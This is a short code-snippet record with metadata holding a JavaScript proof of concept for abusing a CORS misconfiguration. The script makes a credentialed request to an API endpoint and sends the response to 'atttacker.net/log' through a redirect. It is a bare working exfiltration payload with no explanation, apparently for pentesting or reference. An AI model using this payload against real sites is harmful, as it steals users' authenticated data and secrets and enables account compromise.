---
id: 968e6f5b-0b05-4aec-9e85-40cafba67b90
type: code
language: js
verified: false
created_at: '2023-04-06T03:55:54.487730+00:00'
updated_at: '2023-04-06T03:55:54.494815+00:00'
---

# Code Snippet 968e6f5b

**Language**: js

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
